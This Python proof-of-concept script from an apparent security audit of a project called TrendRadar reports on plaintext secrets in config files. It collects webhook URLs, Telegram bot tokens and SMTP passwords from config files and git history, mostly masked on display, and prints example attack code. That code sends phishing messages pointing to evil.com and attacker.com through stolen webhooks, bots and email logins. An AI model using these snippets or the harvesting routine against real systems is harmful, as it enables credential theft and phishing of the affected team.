#!/usr/bin/env python3
"""
Proof of Concept: VUL-002 - Secrets Stored in Plaintext

This script demonstrates:
1. Extracting secrets from config files
2. Finding secrets in git history
3. Using stolen webhooks to send messages
4. Exploiting leaked SMTP credentials

SEVERITY: CRITICAL (CVSS 8.7)
CVE: CWE-312 (Cleartext Storage of Sensitive Information)

Usage:
    python3 poc_secrets_extraction.py [--check-git]

This PoC includes:
  - Static analysis of config files
  - Git history scanning
  - Webhook validation
  - Credential testing simulation
"""

import os
import re
import yaml
import json
import subprocess
from pathlib import Path
from typing import Dict, List, Tuple


class SecretsExtractor:
    """Extract and analyze plaintext secrets"""

    def __init__(self):
        self.secrets_found = []
        self.config_path = Path("config/config.yaml")
        self.env_path = Path("docker/.env")

    def extract_from_config_yaml(self):
        """Extract secrets from config.yaml"""
        print("="*70)
        print(" PoC: Plaintext Secrets Extraction (VUL-002)")
        print("="*70)
        print()
        print("[*] Step 1: Analyzing config/config.yaml...")
        print()

        if not self.config_path.exists():
            print("[!] config.yaml not found")
            return

        with open(self.config_path) as f:
            config = yaml.safe_load(f)

        webhooks = config.get("notification", {}).get("webhooks", {})

        # Check for each type of secret
        secret_types = {
            "Feishu Webhook": webhooks.get("feishu_url", ""),
            "DingTalk Webhook": webhooks.get("dingtalk_url", ""),
            "WeWork Webhook": webhooks.get("wework_url", ""),
            "Telegram Bot Token": webhooks.get("telegram_bot_token", ""),
            "Telegram Chat ID": webhooks.get("telegram_chat_id", ""),
            "Email From": webhooks.get("email_from", ""),
            "Email Password": webhooks.get("email_password", ""),
            "Email SMTP Server": webhooks.get("email_smtp_server", ""),
            "ntfy Topic": webhooks.get("ntfy_topic", ""),
            "ntfy Token": webhooks.get("ntfy_token", "")
        }

        found_count = 0
        for secret_type, secret_value in secret_types.items():
            if secret_value:
                found_count += 1
                # Mask the secret for display
                masked = self._mask_secret(secret_value)
                print(f"  [!] {secret_type:20s}: {masked}")
                self.secrets_found.append({
                    "type": secret_type,
                    "value": secret_value,
                    "source": "config.yaml"
                })
            else:
                print(f"  [ ] {secret_type:20s}: (not configured)")

        print()
        if found_count > 0:
            print(f"[!!!] Found {found_count} secrets in PLAINTEXT!")
            print("[!!!] Anyone with file read access can steal these!")
        else:
            print("[+] No secrets found in config.yaml")
            print("    (Using environment variables - better, but check .env files)")

    def extract_from_env_file(self):
        """Extract secrets from .env file"""
        print("\n" + "="*70)
        print(" Step 2: Analyzing docker/.env...")
        print("="*70)
        print()

        if not self.env_path.exists():
            print("[!] docker/.env not found")
            return

        with open(self.env_path) as f:
            content = f.read()

        # Parse .env file
        env_vars = {}
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#') and '=' in line:
                key, value = line.split('=', 1)
                env_vars[key] = value

        # Check for secrets
        secret_patterns = {
            "FEISHU_WEBHOOK_URL": "Feishu Webhook",
            "DINGTALK_WEBHOOK_URL": "DingTalk Webhook",
            "WEWORK_WEBHOOK_URL": "WeWork Webhook",
            "TELEGRAM_BOT_TOKEN": "Telegram Bot Token",
            "TELEGRAM_CHAT_ID": "Telegram Chat ID",
            "EMAIL_PASSWORD": "Email Password",
            "NTFY_TOKEN": "ntfy Token"
        }

        found_count = 0
        for env_key, secret_type in secret_patterns.items():
            if env_key in env_vars and env_vars[env_key]:
                found_count += 1
                masked = self._mask_secret(env_vars[env_key])
                print(f"  [!] {secret_type:20s}: {masked}")
                self.secrets_found.append({
                    "type": secret_type,
                    "value": env_vars[env_key],
                    "source": "docker/.env"
                })
            else:
                print(f"  [ ] {secret_type:20s}: (not set)")

        print()
        if found_count > 0:
            print(f"[!!!] Found {found_count} secrets in .env file!")
            print("[!!!] .env file should NEVER be committed to git!")
        else:
            print("[+] docker/.env template is clean (no actual secrets)")
            print("    Make sure production .env is not in git!")

    def search_git_history(self):
        """Search git history for leaked secrets"""
        print("\n" + "="*70)
        print(" Step 3: Scanning Git History for Leaked Secrets...")
        print("="*70)
        print()

        if not Path(".git").exists():
            print("[!] Not a git repository")
            return

        print("[*] Searching git log for secret patterns...")
        print()

        # Patterns to search for
        patterns = {
            "Feishu Webhook": r"https://open\.feishu\.cn/open-apis/bot/v2/hook/[a-zA-Z0-9-]+",
            "DingTalk Webhook": r"https://oapi\.dingtalk\.com/robot/send\?access_token=[a-zA-Z0-9]+",
            "Telegram Token": r"\d{10}:[a-zA-Z0-9_-]{35}",
            "Email Password": r"email_password:\s*['\"]([^'\"]+)['\"]",
            "Generic Secret": r"(password|token|secret|key):\s*['\"]([^'\"]{8,})['\"]"
        }

        findings = []

        for secret_type, pattern in patterns.items():
            try:
                # Search entire git history
                cmd = ["git", "log", "-p", "--all", "-S", pattern, "--", "config/"]
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0 and result.stdout:
                    # Use grep to find actual matches
                    matches = re.findall(pattern, result.stdout, re.IGNORECASE)
                    if matches:
                        findings.append((secret_type, len(matches)))
                        print(f"  [!!!] {secret_type}: Found {len(matches)} potential leaks in history!")

            except subprocess.TimeoutExpired:
                print(f"  [!] Timeout searching for {secret_type}")
            except Exception as e:
                print(f"  [!] Error searching for {secret_type}: {e}")

        print()
        if findings:
            print(f"[!!!] CRITICAL: Found {len(findings)} types of secrets in git history!")
            print()
            print("Even if secrets are removed from current files,")
            print("they remain in git history forever!")
            print()
            print("Attackers can extract them with:")
            print("  git log -p | grep -i 'webhook'")
            print("  git log -p | grep -i 'password'")
            print()
            print("IMMEDIATE ACTIONS REQUIRED:")
            print("  1. Rotate ALL credentials immediately")
            print("  2. Use git-filter-branch or BFG to purge history")
            print("  3. Force push cleaned history (breaks forks!)")
            print("  4. Notify all users to re-clone repository")
        else:
            print("[+] No obvious secrets found in git history")
            print("    (Manual review recommended)")

    def demonstrate_webhook_abuse(self):
        """Demonstrate webhook abuse scenarios"""
        print("\n" + "="*70)
        print(" Attack Scenario 1: Webhook Hijacking")
        print("="*70)
        print()

        # Filter webhooks from found secrets
        webhooks = [s for s in self.secrets_found if "Webhook" in s["type"]]

        if webhooks:
            print("[*] Found active webhooks that could be abused:")
            print()
            for webhook in webhooks:
                print(f"  • {webhook['type']}")
                print(f"    Source: {webhook['source']}")
                print()

            print("[*] Attack Vector:")
            print()
            print("   import requests")
            print()
            print("   # Stolen Feishu webhook")
            print(f"   webhook = '{self._mask_secret(webhooks[0]['value'])}'")
            print()
            print("   # Send phishing message to entire team")
            print("   requests.post(webhook, json={")
            print("       'msg_type': 'text',")
            print("       'content': {")
            print("           'text': 'URGENT: System compromised. '")
            print("                   'Click here to secure: http://evil.com'")
            print("       }")
            print("   })")
            print()
            print("[!] Impact:")
            print("    • Phishing attacks on team members")
            print("    • Spam/harassment via webhook")
            print("    • Social engineering attacks")
            print("    • Reputation damage")
            print("    • Cannot revoke without reconfiguring all systems")

        else:
            print("[*] No active webhooks found in configs")
            print("    (Good! But verify git history)")

    def demonstrate_email_abuse(self):
        """Demonstrate email credential abuse"""
        print("\n" + "="*70)
        print(" Attack Scenario 2: Email Account Compromise")
        print("="*70)
        print()

        # Filter email credentials
        email_secrets = [s for s in self.secrets_found
                        if "Email" in s["type"]]

        if email_secrets:
            print("[*] Found email credentials in plaintext:")
            print()
            for secret in email_secrets:
                print(f"  • {secret['type']}: {self._mask_secret(secret['value'])}")

            print()
            print("[*] Attack Vector:")
            print()
            print("   import smtplib")
            print("   from email.mime.text import MIMEText")
            print()
            print("   # Stolen credentials")
            print("   smtp_server = config['email_smtp_server']")
            print("   email_from = config['email_from']")
            print("   password = config['email_password']  # PLAINTEXT!")
            print()
            print("   # Attacker logs in")
            print("   server = smtplib.SMTP(smtp_server, 587)")
            print("   server.starttls()")
            print("   server.login(email_from, password)")
            print()
            print("   # Send spam/phishing campaigns")
            print("   msg = MIMEText('Click here: http://evil.com')")
            print("   msg['Subject'] = 'Urgent: Account Verification'")
            print("   server.sendmail(email_from, 'victim@example.com', msg.as_string())")
            print()
            print("[!] Impact:")
            print("    • Complete email account takeover")
            print("    • Spam campaigns from legitimate account")
            print("    • Phishing attacks with trusted sender")
            print("    • Access to sent/received emails")
            print("    • Potential access to other services (password reset)")

        else:
            print("[*] No email credentials found in configs")

    def demonstrate_telegram_abuse(self):
        """Demonstrate Telegram bot abuse"""
        print("\n" + "="*70)
        print(" Attack Scenario 3: Telegram Bot Takeover")
        print("="*70)
        print()

        telegram_secrets = [s for s in self.secrets_found
                           if "Telegram" in s["type"]]

        if len(telegram_secrets) >= 2:  # Need both token and chat_id
            print("[*] Found complete Telegram configuration:")
            print()
            for secret in telegram_secrets:
                print(f"  • {secret['type']}: {self._mask_secret(secret['value'])}")

            print()
            print("[*] Attack Vector:")
            print()
            print("   import requests")
            print()
            print("   # Stolen credentials")
            print("   bot_token = config['telegram_bot_token']")
            print("   chat_id = config['telegram_chat_id']")
            print()
            print("   # Send malicious messages")
            print("   url = f'https://api.telegram.org/bot{bot_token}/sendMessage'")
            print("   requests.post(url, json={")
            print("       'chat_id': chat_id,")
            print("       'text': '🚨 SECURITY ALERT: Your system has been compromised. '")
            print("               'Reset password at: http://attacker.com'")
            print("   })")
            print()
            print("   # Even worse: Attacker can:")
            print("   # - Read all messages sent to bot")
            print("   # - Impersonate the bot")
            print("   # - Modify bot settings")
            print("   # - Delete the bot entirely")
            print()
            print("[!] Impact:")
            print("    • Phishing via trusted bot")
            print("    • Read sensitive messages/alerts")
            print("    • Impersonation attacks")
            print("    • Bot deletion (denial of service)")

        else:
            print("[*] Incomplete Telegram configuration found")

    def show_remediation(self):
        """Show comprehensive remediation steps"""
        print("\n" + "="*70)
        print(" Comprehensive Remediation Plan")
        print("="*70)
        print()

        print("IMMEDIATE ACTIONS (< 24 hours):")
        print()
        print("1. Rotate ALL credentials:")
        print("   • Regenerate all webhook URLs")
        print("   • Change all passwords")
        print("   • Revoke and create new tokens")
        print("   • Update email credentials")
        print()
        print("2. Remove secrets from config files:")
        print("   • Delete all webhook URLs from config.yaml")
        print("   • Delete all passwords from .env")
        print("   • Use environment variables ONLY")
        print()
        print("3. Clean git history:")
        print("   git filter-branch --force --index-filter \\")
        print("     'git rm --cached --ignore-unmatch config/config.yaml' \\")
        print("     --prune-empty --tag-name-filter cat -- --all")
        print("   git push --force --all")
        print()

        print("\nSHORT-TERM (< 1 week):")
        print()
        print("4. Implement secrets management:")
        print()
        print("   # Use environment variables")
        print("   FEISHU_WEBHOOK_URL = os.getenv('FEISHU_WEBHOOK_URL')")
        print("   if not FEISHU_WEBHOOK_URL:")
        print("       raise ValueError('FEISHU_WEBHOOK_URL not set')")
        print()
        print("5. Add .env to .gitignore:")
        print("   echo '.env' >> .gitignore")
        print("   echo '.env.*' >> .gitignore")
        print("   echo 'config/config.yaml' >> .gitignore  # If has secrets")
        print()
        print("6. Add pre-commit hooks to detect secrets:")
        print("   # .git/hooks/pre-commit")
        print("   #!/bin/bash")
        print("   if git diff --cached | grep -i 'webhook\\|password\\|token'; then")
        print("       echo 'ERROR: Potential secret detected!'")
        print("       exit 1")
        print("   fi")
        print()

        print("\nLONG-TERM (< 1 month):")
        print()
        print("7. Migrate to secrets vault:")
        print("   • HashiCorp Vault")
        print("   • AWS Secrets Manager")
        print("   • Azure Key Vault")
        print("   • Google Secret Manager")
        print()
        print("8. Implement encryption at rest:")
        print("   from cryptography.fernet import Fernet")
        print()
        print("   key = Fernet.generate_key()  # Store in secure location")
        print("   cipher = Fernet(key)")
        print("   encrypted = cipher.encrypt(secret.encode())")
        print()
        print("9. Add security scanning to CI/CD:")
        print("   • Trufflehog - detect secrets in git")
        print("   • git-secrets - prevent commits with secrets")
        print("   • Snyk - dependency scanning")
        print("   • SAST tools - static analysis")
        print()
        print("10. Implement audit logging:")
        print("    • Log all webhook usage")
        print("    • Alert on credential changes")
        print("    • Monitor for unusual patterns")

    def _mask_secret(self, secret: str) -> str:
        """Mask secret for display"""
        if not secret:
            return "(empty)"
        if len(secret) < 10:
            return "*" * len(secret)
        return secret[:4] + "*" * (len(secret) - 8) + secret[-4:]

    def generate_report(self):
        """Generate comprehensive security report"""
        print("\n" + "="*70)
        print(" Security Report Summary")
        print("="*70)
        print()
        print(f"Total secrets found: {len(self.secrets_found)}")
        print()

        if self.secrets_found:
            print("Secrets by type:")
            secret_counts = {}
            for secret in self.secrets_found:
                secret_type = secret['type']
                secret_counts[secret_type] = secret_counts.get(secret_type, 0) + 1

            for secret_type, count in sorted(secret_counts.items()):
                print(f"  • {secret_type}: {count}")

            print()
            print("Secrets by source:")
            source_counts = {}
            for secret in self.secrets_found:
                source = secret['source']
                source_counts[source] = source_counts.get(source, 0) + 1

            for source, count in sorted(source_counts.items()):
                print(f"  • {source}: {count}")

            print()
            print("[!!!] CRITICAL SECURITY ISSUE [!!!]")
            print()
            print("All secrets are stored in PLAINTEXT!")
            print("Anyone with file access can steal credentials!")
            print()

        else:
            print("[+] No plaintext secrets found in current files")
            print("    (Still check git history and environment variables)")


def main():
    import sys

    print()
    print("="*70)
    print(" TrendRadar Secrets Extraction PoC")
    print(" VUL-002: Plaintext Secrets Storage")
    print("="*70)
    print()

    extractor = SecretsExtractor()

    # Extract from config files
    extractor.extract_from_config_yaml()
    extractor.extract_from_env_file()

    # Check git history if requested
    if "--check-git" in sys.argv:
        extractor.search_git_history()

    # Demonstrate attack scenarios
    extractor.demonstrate_webhook_abuse()
    extractor.demonstrate_email_abuse()
    extractor.demonstrate_telegram_abuse()

    # Show remediation
    extractor.show_remediation()

    # Generate report
    extractor.generate_report()

    print("\n" + "="*70)
    print(" PoC Complete")
    print("="*70)
    print()
    print("[!] CRITICAL: Secrets must be encrypted or stored in secure vault")
    print("[!] Rotate all credentials immediately!")
    print()


if __name__ == "__main__":
    main()
